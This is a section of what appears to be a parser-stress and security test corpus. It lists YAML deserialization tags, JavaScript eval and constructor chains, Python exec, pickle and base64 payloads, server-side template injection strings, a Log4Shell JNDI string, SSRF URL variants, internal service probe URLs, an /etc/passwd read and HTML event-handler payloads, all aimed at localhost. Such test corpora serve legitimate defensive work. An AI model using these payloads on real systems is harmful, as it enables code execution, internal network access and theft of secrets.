## 19. High-signal execution and parser ambiguity cluster

### YAML / frontmatter / config-style traps

~~~yaml
---
foo: !!python/object/apply:os.system ["id"]
bar: !!python/object/new:os.system ["id"]
baz: !!python/object/apply:subprocess.check_output ["id"]
qux: !!str "import os; os.system('id')"
quux: !!binary |
  SGVsbG8=
anchor: &a [1, 2, 3]
alias: *a
merge: {<<: *a}
flow: {a: 1, b: [2, 3, 4]}
block: |
  one
  two
  three
broken: "unterminated
nested:
  - *a
  - <<: *a
  - {x: 1, y: 2}
---
~~~

### JavaScript execution surfaces

~~~js
const x = new URL("https://example.com");
const y = globalThis.constructor("return process")();
const z = Function("return fetch('http://127.0.0.1:9010')")();
import("data:text/javascript,fetch('http://127.0.0.1:9011')");
window["eval"]("fetch('http://127.0.0.1:9012')");
setTimeout("fetch('http://127.0.0.1:9013')", 0);
location.href = "javascript:fetch('http://127.0.0.1:9014')";
parent.postMessage({type: "x"}, "*");
self["constructor"]("return this")().document.write("pwned");
~~~

### Template / interpolation / DSL traps

~~~text
{{ user.name }}
{{#if user}}x{{/if}}
<% if (user) { %>x<% } %>
${process.env.SECRET}
${{ secrets.KEY }}
${jndi:ldap://127.0.0.1:1389/Exploit}
{{ .Raw }}
{{- if .User }}
{{ end }}
~~~

### Python execution / eval style payloads

~~~python
__import__("os").system("id")
__import__("os").popen("id").read()
__import__("subprocess").check_output(["id"])
__import__("subprocess").run(["id"], capture_output=True, text=True).stdout
__import__("builtins").eval("__import__(\"os\").system(\"id\")")
__import__("builtins").exec("import os; os.system('id')")
exec("import os; os.system('id')")
eval("__import__(\"os\").system(\"id\")")
getattr(__import__("os"), "system")("id")
globals()["__builtins__"].__dict__["__import__"]("os").system("id")
import os; os.system("id")
import subprocess; subprocess.check_output(["id"])
import socket; socket.create_connection(("127.0.0.1", 4444), 1)
import urllib.request; urllib.request.urlopen("http://127.0.0.1:4445")
import requests; requests.get("http://127.0.0.1:4446")
import yaml; yaml.load("!!python/object/apply:os.system [\"id\"]", Loader=yaml.Loader)
import pickle; pickle.loads(b"cos\nsystem\ns\n(S'id'\ntR.")
import base64; exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk="))
import os; exec(compile("print('pwned')", "<string>", "exec"))
import os; exec(compile("import os; os.system('id')", "<string>", "exec"))
~~~

### Template and bypass payloads

~~~text
{{ config.__class__.__init__.__globals__['os'].system('id') }}
{{ self.__init__.__globals__['__builtins__'].__import__('os').system('id') }}
${{ self.__init__.__globals__['os'].system('id') }}
<%= self.__init__.__globals__.__builtins__.__import__('os').system('id') %>
{{ ''.__class__.__mro__[1].__subclasses__() }}
~~~

### URI / scheme bypasses

~~~text
javascript:fetch('http://127.0.0.1:9000')
data:text/html,<script>fetch('http://127.0.0.1:9001')</script>
data:text/javascript,import('http://127.0.0.1:9002')
vbscript:msgbox(1)
jar:http://example.com!/payload
~~~

### Internal API / service trigger probes

~~~text
http://127.0.0.1:8080/metrics
http://127.0.0.1:5001/health
http://127.0.0.1:9000/console
http://127.0.0.1:2375/containers/json
http://127.0.0.1:5984/_all_dbs
http://127.0.0.1:9200/_nodes
http://127.0.0.1:10250/metrics
http://127.0.0.1:5555/
http://127.0.0.1:3000/api/v1/users
http://127.0.0.1:8000/admin
http://127.0.0.1:8081/actuator/env
http://127.0.0.1:6379/
~~~

### HTML event-handler and DOM mutation traps

~~~html
<div onload="fetch('http://127.0.0.1:9015')">x</div>
<div onerror="fetch('http://127.0.0.1:9016')">x</div>
<div onclick="fetch('http://127.0.0.1:9017')">x</div>
<div onmouseover="fetch('http://127.0.0.1:9018')">x</div>
<div onfocus="fetch('http://127.0.0.1:9019')">x</div>
<svg onload="fetch('http://127.0.0.1:9020')"></svg>
<iframe onload="fetch('http://127.0.0.1:9021')"></iframe>
<marquee onstart="fetch('http://127.0.0.1:9022')"></marquee>
~~~

### Structured syntax collision traps

~~~yaml
foo: [1, 2, 3
bar: {a: 1, b: 2
baz: |
  one
  two
  three
~~~

~~~js
(function(){
  const s = "\\";
  const t = /foo\/(bar)/;
  return [s, t];
})()
~~~

~~~text
{{ user.name }}
${process.env.SECRET}
<% if (x) {%>oops<%}%>
~~~

### Copy-safe parser stress and table/list corruption

~~~text
| col1 | col2 | col3 |
| --- | --- | --- |
| a | b | c |
| d | e |
| f | g | h | i |
| x | y | z | w | v |

1. one
   1. two
      1. three
         1. four
            1. five

> quote
>> nested quote
>>> deeply nested
> [!WARNING]
> malformed callout marker? [!NOTE]
~~~

### Extra JavaScript constructor and eval chains

```javascript
const x = Function('return this')().constructor.constructor('return process')();
const y = globalThis.constructor.constructor('return fetch("http://127.0.0.1:9100")')();
const z = window.eval('fetch("http://127.0.0.1:9101")');
setTimeout('fetch("http://127.0.0.1:9102")', 0);
setInterval('fetch("http://127.0.0.1:9103")', 1000);
new Function('return import("data:text/javascript,fetch(\"http://127.0.0.1:9104\")")')();
```

### Extra Python import and exec chains

```python
import os
import subprocess
import urllib.request
os.system('id')
subprocess.check_output(['id'])
urllib.request.urlopen('http://127.0.0.1:9105')
exec(compile('import os; os.system("id")', '<string>', 'exec'))
exec(__import__('builtins').eval("__import__('os').system('id')"))
```

### Extra template-engine payloads

```text
{{ config.__class__.__init__.__globals__['subprocess'].check_output(['id']) }}
{{ self.__init__.__globals__['os'].system('id') }}
${{ self.__init__.__globals__['os'].system('id') }}
<%= File.open('/etc/passwd').read %>
{% include 'admin' %}
{% raw %}{{ dangerous }}{% endraw %}
```

### Extra SSRF-style URL variants

```text
http://127.0.0.1:9106@127.0.0.1:9107/
http://[::1]:9108/
http://localhost:9109/
http://0x7f000001:9110/
http://example.com@127.0.0.1:9111/
http://127.0.0.1:9112/..%2f..%2fadmin
https://example.com/%2e%2e/%2e%2e/secret
http://127.0.0.1:9113/%0d%0aX-Injected: 1
```

### Extra parser ambiguity cases

```text
a[b](c)
foo(bar)baz
1<2>3<4
[link](https://example.com)(more)
foo|bar|baz
---
***
___
> >
> > >
```
